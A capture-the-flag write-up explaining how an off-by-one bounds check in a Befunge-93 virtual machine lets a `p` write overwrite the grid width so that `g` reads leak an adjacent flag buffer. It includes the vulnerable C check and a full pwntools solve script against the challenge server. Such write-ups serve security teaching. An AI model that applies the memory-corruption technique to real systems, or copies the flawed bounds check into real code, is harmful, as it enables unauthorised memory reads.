## TL;DR

The target implements a custom 2D grid virtual machine based on the esoteric programming language **Befunge-93**. The main program reads `flag.txt` into a global buffer at offset `0x56e0` immediately following the $50 \times 22$ VM board at `0x5260`. The VM enforces boundary limits on the grid inspection instructions `g` (get byte) and `p` (put byte) by comparing against global variables `rows` (50) and `cols` (22) stored right after the board. An off-by-one boundary check (`<=` instead of `<`) allows executing `p` at $(y=50, x=4)$ to overwrite `cols = 200`. With the grid width expanded, subsequent `g` instructions read out-of-bounds directly into the adjacent `flag` buffer, and `,` instructions stream the flag characters to stdout.

## Static Analysis & Vulnerability

### 1. Global Memory Layout

Examining the `.bss` and `.data` layout in GDB:

```text
0x5260: board[50 * 22]  (1100 bytes = 0x44c)
0x56ac: rows            (int, default = 50)
0x56b0: cols            (int, default = 22)
0x56b4: diry / dirx     (VM direction vectors)
0x56b8: pcx / pcy       (Program counter coordinates)
...
0x56e0: flag[104]       (Contains the target flag!)
```

Index formula for any grid coordinate $(x, y)$:
$$\text{Index} = y \times \text{cols} + x$$

### 2. Befunge Instruction Semantics & Off-by-One

The VM implements standard Befunge-93 opcodes:
- `g`: Pops $y$, pops $x$, pushes `board[y * cols + x]`.
- `p`: Pops $y$, pops $x$, pops $v$, writes `board[y * cols + x] = v`.
- `,`: Pops $v$, outputs $v$ as an ASCII character.
- `>`, `<`, `^`, `v`: Change direction of the instruction pointer.

The boundary check in `step()`:
```c
if (y <= rows && x <= cols) {   // VULNERABILITY: '<=' off-by-one allows y=50, x=4
    board[y * cols + x] = val;
}
```
Because the check uses `<=` instead of `<`, when $y = 50$:
$$\text{Index} = 50 \times 22 + 4 = 1100 + 4 = 1104$$
Offset $1104$ relative to `board` (`0x5260`) lands directly on the `cols` variable at `0x56b0`!

```text
       0x5260: board[0..1099]  (50 rows x 22 cols)
       0x56ac: rows = 50
       0x56b0: cols = 22       <-- Target of p at (y=50, x=4)!
               Overwritten to: cols = 200
               ...
       0x56e0: flag buffer     <-- Now reachable via expanded grid!
```

## Dynamic Analysis & Exploitation Strategy

### 1. Generating Stack Numbers in Befunge
In Befunge, digits `0` through `9` push literal values. Numbers like 50 and 200 can be generated by arithmetic chaining:
- `0!` evaluates to `1`.
- Chaining `:` (duplicate) and `+` (add) builds powers of 2.

### 2. Modifying `cols = 200`
We route the instruction pointer to execute:
$$\text{push } 200 \longrightarrow \text{push } 4 \longrightarrow \text{push } 50 \longrightarrow \text{opcode } p$$
This writes $200$ into memory at `board + 1104`, expanding `cols` to 200.

### 3. Dumping the Flag
With `cols = 200`, accessing $(x, y)$ coordinates allows index values far past the board:
- Address of `flag`: `0x56e0`
- Offset: $0\text{x}56\text{e}0 - 0\text{x}5260 = 1152 \text{ bytes}$.
- We implement a tight Befunge loop:
  $$\text{fetch flag byte using } g \longrightarrow \text{output using } , \longrightarrow \text{increment index} \longrightarrow \text{repeat}$$
- The VM outputs each character sequentially to standard output until encountering `@` (halt).

## Exploit

The complete exploit script is available at [solve.py](solve.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.log_level = "info"
HOST, PORT = "mars.picoctf.net", 31689

# Line 1: Build 50 on stack and route downwards
line_1 = b"\x30\x21\x3a\x2b" + b"\x3a\x3a\x3a\x3a\x2b\x2b\x2b\x2b" * 2 + b"\x76"

# Line 2: Moving left, build value 200
line_2 = b"\x3c\x30\x30\x70\x30\x30\x67\x3a\x3a\x3a\x2b\x2b\x2b\x30\x30\x67\x30\x21\x3a\x2b\x76"[::-1]

# Line 3: Set cols = 200 via opcode 'p' at (y=50, x=4)
line_3 = b"\x3e\x3a\x2b\x5c\x70\x30" + b"\x3e" * 14 + b"\x76"

# Line 4: Loop: get byte from flag buffer via 'g' and stream to stdout via ','
line_4 = (b"\x3c\x3a\x30\x30\x67\x67\x2c" + b"\x30\x21\x2b" + b"\x3c" * 11)[::-1]

def solve():
    io = remote(HOST, PORT)
    io.recvuntil(b"sol", timeout=5)

    io.sendline(line_1)
    io.sendline(line_2)
    io.sendline(line_3)
    io.sendline(line_4)

    data = io.recvrepeat(timeout=3)
    m = re.search(rb"picoCTF\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))
    io.close()

if __name__ == "__main__":
    solve()
```

## Key Takeaways & Lessons

1. **Internal State Variable Adjacency:** In custom virtual machines, state variables (such as grid dimensions, instruction pointers, and registers) are often stored contiguous with the VM's memory canvas, making off-by-one errors fatal to state integrity.
2. **Self-Modifying VM Topologies:** Altering metadata variables (like `cols`) fundamentally changes how the VM calculates 2D-to-1D memory addresses, transforming localized reads into unbounded memory dumpers.
3. **Esoteric Language Exploitation:** Complex 2D grid languages like Befunge can be steered into reliable payload pipelines by treating instruction direction vectors (`>`, `<`, `^`, `v`) as state transitions in a finite automaton.
